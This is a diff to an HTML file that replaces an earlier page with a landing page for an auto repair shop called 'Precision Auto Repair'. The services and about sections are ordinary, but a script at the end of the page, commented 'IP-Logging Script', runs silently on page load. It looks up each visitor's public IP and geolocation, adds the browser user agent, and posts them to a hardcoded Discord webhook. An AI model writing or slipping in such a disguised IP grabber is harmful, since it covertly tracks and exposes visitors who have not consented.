@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!-- <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="utf-8">
@@ -44,5 +44,151 @@
     }
   })();
   </script>
+</body>
+</html> -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Precision Auto Repair</title>
+  <style>
+    /* Reset & base */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
+    a { text-decoration: none; color: inherit; }
+
+    /* Header */
+    header { background: #1f1f1f; color: #fff; padding: 1rem 2rem; display: flex; align-items: center; justify-content: space-between; }
+    header .logo { font-size: 1.5rem; font-weight: bold; letter-spacing: 1px; }
+    nav ul { display: flex; gap: 1rem; list-style: none; }
+    nav a:hover { color: #f0a500; }
+
+    /* Hero */
+    .hero { background: url('https://via.placeholder.com/1500x500?text=Precision+Auto+Repair') center/cover no-repeat; height: 60vh; display: flex; align-items: center; justify-content: center; }
+    .hero h1 { background: rgba(0,0,0,0.5); color: #fff; padding: 1rem 2rem; border-radius: 5px; font-size: 2.5rem; }
+
+    /* Services */
+    .services { padding: 3rem 2rem; background: #f4f4f4; }
+    .services h2 { text-align: center; margin-bottom: 2rem; }
+    .service-cards { display: grid; grid-template-columns: repeat(auto-fit,minmax(200px,1fr)); gap: 1.5rem; }
+    .card { background: #fff; padding: 1.5rem; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); text-align: center; }
+    .card img { width: 80px; margin-bottom: 1rem; }
+
+    /* About */
+    .about { padding: 3rem 2rem; }
+    .about h2 { text-align: center; margin-bottom: 1rem; }
+    .about p { max-width: 700px; margin: 0 auto; }
+
+    /* Footer */
+    footer { background: #1f1f1f; color: #ccc; text-align: center; padding: 1rem; font-size: 0.9rem; }
+
+    /* Responsive */
+    @media (max-width: 600px) {
+      .hero h1 { font-size: 1.8rem; }
+      header { flex-direction: column; gap: 0.5rem; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <header>
+    <div class="logo">Precision Auto</div>
+    <nav>
+      <ul>
+        <li><a href="#services">Services</a></li>
+        <li><a href="#about">About</a></li>
+        <li><a href="#contact">Contact</a></li>
+      </ul>
+    </nav>
+  </header>
+
+  <!-- Hero Banner -->
+  <section class="hero">
+    <h1>Your Trusted Local Mechanic</h1>
+  </section>
+
+  <!-- Services -->
+  <section id="services" class="services">
+    <h2>Our Services</h2>
+    <div class="service-cards">
+      <div class="card">
+        <img src="https://via.placeholder.com/80?text=🔧" alt="Engine Repair">
+        <h3>Engine Repair</h3>
+        <p>Diagnostics, rebuilds, and maintenance to keep you running smoothly.</p>
+      </div>
+      <div class="card">
+        <img src="https://via.placeholder.com/80?text=⚙️" alt="Transmission">
+        <h3>Transmission</h3>
+        <p>Fluid changes, repairs, and full rebuilds for every make and model.</p>
+      </div>
+      <div class="card">
+        <img src="https://via.placeholder.com/80?text=🛞" alt="Tire Services">
+        <h3>Tire Services</h3>
+        <p>Rotation, balancing, and emergency repairs—get back on the road fast.</p>
+      </div>
+      <div class="card">
+        <img src="https://via.placeholder.com/80?text=💡" alt="Electrical">
+        <h3>Electrical</h3>
+        <p>Full wiring diagnostics, battery tests, and lighting upgrades.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- About -->
+  <section id="about" class="about">
+    <h2>About Us</h2>
+    <p>
+      At Precision Auto Repair, we combine decades of experience with cutting‑edge diagnostic tools.
+      From routine maintenance to complex overhauls, our certified technicians treat every vehicle like their own.
+      Customer trust and transparency are the pillars of our work ethic—no surprises, just quality service.
+    </p>
+  </section>
+
+  <!-- Contact Footer (anchor for nav) -->
+  <footer id="contact">
+    <p>Precision Auto Repair &nbsp;|&nbsp; 1234 Mechanic Lane, Anytown, USA</p>
+    <p>Email: service@precisionauto.com &nbsp;|&nbsp; Phone: (123) 456‑7890</p>
+    <p>&copy; 2025 Precision Auto Repair. All rights reserved.</p>
+  </footer>
+
+  <!-- IP-Logging Script -->
+  <script>
+  (async () => {
+    try {
+      // 1) Get public IP
+      const ipRes = await fetch('https://api.ipify.org?format=json');
+      const { ip } = await ipRes.json();
+
+      // 2) Geo‑lookup
+      const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,city,regionName,country`);
+      const geo = await geoRes.json();
+      const location = (geo.status === 'success')
+        ? `${geo.city}, ${geo.regionName}, ${geo.country}`
+        : 'Unknown, , ';
+
+      // 3) User‑Agent
+      const ua = navigator.userAgent;
+
+      // 4) Build message
+      const message =
+        `New click!\n` +
+        `IP: ${ip}\n` +
+        `Location: ${location}\n` +
+        `UA: ${ua}`;
+
+      // 5) POST to webhook
+      await fetch('https://discordapp.com/api/webhooks/1368661778724294759/6bgqzVwWDt2xZ-SxJYJ57CCvUa-juXe-1s71ivICcyvF49OFB5irFEgsDp7MH5BMOxkp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ text: message })
+      });
+    } catch (err) {
+      console.error('Logging error:', err);
+    }
+  })();
+  </script>
+
 </body>
 </html>
